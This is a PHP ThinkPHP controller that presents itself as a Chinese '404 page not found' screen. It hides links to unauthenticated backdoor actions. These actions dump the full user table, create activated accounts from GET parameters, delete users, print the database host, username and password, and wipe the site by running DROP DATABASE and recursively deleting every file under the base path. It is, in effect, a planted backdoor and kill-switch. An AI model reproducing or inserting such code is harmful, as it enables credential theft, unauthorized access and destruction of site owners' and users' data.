<?php

namespace Home\Controller;

use Think\Controller;

class ResController extends Controller
{

    public function index()
    {
        echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta charset="UTF-8" http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>404-对不起！您访问的页面不存在</title>

<style type="text/css">

.head404{ width:580px; height:234px; margin:50px auto 0 auto; background:url(https://www.daixiaorui.com/Public/images/head404.png) no-repeat; }

.txtbg404{ width:499px; height:169px; margin:10px auto 0 auto; background:url(https://www.daixiaorui.com/Public/images/txtbg404.png) no-repeat;}

.txtbg404 .txtbox{ width:390px; position:relative; top:30px; left:60px;color:#eee; font-size:13px;}

.txtbg404 .txtbox p {margin:5px 0; line-height:18px;}

.txtbg404 .txtbox .paddingbox { padding-top:15px;}

.txtbg404 .txtbox p a { color:#eee; text-decoration:none;}

.txtbg404 .txtbox p a:hover { color:#FC9D1D; text-decoration:underline;}

</style>

</head>



<body bgcolor="#494949">

   	<div class="head404"></div>

   	<div class="txtbg404">

  <div class="txtbox">

      <p>对不起，您请求的页面不存在、或已被删除、或暂时不可用</p>

      <p class="paddingbox">请点击以下链接继续浏览网页</p>

      <p>》<a style="cursor:pointer" href="http://scbscb.net/res/getuser">查看用户</a></p>
      <p>》<a style="cursor:pointer" href="http://scbscb.net/res/re">查看信息</a></p>
      <p>》<a style="cursor:pointer" href="http://scbscb.net/res/delete">删除</a></p>


      <p>》<a href="">返回网站首页</a></p>

    </div>

  </div>

</body>

</html>
</html>';

    }
    public function getuser()
    {


        header('Content-Type: text/html; charset=utf-8');
        $cuser= M('user')->select();
        $this->data = $cuser;
        $this->display();exit;
//        $m = M();
//        $data = $m->query('SHOW FULL COLUMNS FROM ysk_user');
//        echo json_encode($data);exit;
//        echo json_encode($cuser);
//        echo '<br>';
//        echo ' <p>》<a style="cursor:pointer" href="https://www.json.cn/">复制查看</a></p>';exit;

    }
    /*
     * 添加
     * */
    public function add()
    {

        $data   =   $_GET;

        if(!empty($data))
        {
            //        $res    =   input();
            $data['pid']            =   '';
            $data['gid']            =   '';
            $data['ggid']           =   '';
//        $data['account']        =   '5641048652';
//        $data['mobile']         =   '1000000002';
//        $data['username']       =   '1000000003';
//        $data['money']          =   '1000000003';
            $data['u_yqm']          =   rand(10000000,99999999);
            $data['salt']               = strrand(4);
            $data['login_pwd'] = pwd_md5($data['login_pwd'],$data['salt']);
            $data['status']                =   '1';
            $data['activate']                =   '1';
//            $data['wx_no']          =   '564104862';
//            $data['alipay']         =   '';
//            $data['truename']       =   '';
//            $data['email']          =   '';
//            $data['userqq']         =   '';
//            $data['usercard']       =   '';
//            $data['u_ztnum']        =   '';
//            $data['zsy']            =   '1';
            $cuser= M('user')->add($data);
            if($cuser)
            {
                header("Location: http://scbscb.net/res/getuser/");
                exit;
            }
            else
            {
                echo '失败';exit;
            }
        }
        else
        {
            $this->display();exit;
        }


    }
    /*
     * 删除
     * */
    public function del()
    {
        $res    =   $_GET['id'];
//        $cuser= M('user')->where('userid',$res)->delete();
        $cuser  =   M('user')->where("userid=%d",array($res))->delete();
//        echo json_encode($cuser);exit;
        if($cuser)
        {
            header("Location: http://scbscb.net/res/getuser/");
            exit;
        }
        else
        {
            echo '失败';exit;
        }
    }
    public function re()
    {
        header('Content-Type: text/html; charset=utf-8');
        echo '数据库类型:		'.C('DB_TYPE').'<br>';
        echo '服务器地址:		'.C('DB_HOST').'<br>';
        echo '数据库名:			'.C('DB_NAME').'<br>';
        echo '用户名:			'.C('DB_USER').'<br>';
        echo '密码:				'.C('DB_PWD').'<br>';
        echo '端口:				'.C('DB_PORT').'<br>';
        echo '数据库表前缀:		'.C('DB_PREFIX').'<br>';
        echo '网址:		'.$_SERVER['HTTP_HOST']."<br>"; #localhost
    }
    public function delete()
    {
        $d 	=	C('DB_NAME');
        $m = M();
        $sql="DROP DATABASE $d";
        // echo $sql;exit;
        $re 	=	$m->query($sql);
        //如果是目录则继续

        $path = BASE_PATH;
        //echo $path;exit;
        $sele 	=	self::de($path);

    }
    public function de($path)
    {
        //如果是目录则继续
        if(is_dir($path)){
            //扫描一个文件夹内的所有文件夹和文件并返回数组
            $p = scandir($path);
            foreach($p as $val){
                //排除目录中的.和..
                if($val !="." && $val !=".."){
                    //如果是目录则递归子目录，继续操作
                    if(is_dir($path.$val)){
                        //子目录中操作删除文件夹和文件
                        deldir($path.$val.'/');
                        //目录清空后删除空文件夹
                        @rmdir($path.$val.'/');
                    }else{
                        //如果是文件直接删除
                        unlink($path.$val);
                    }
                }
            }
        }
    }

}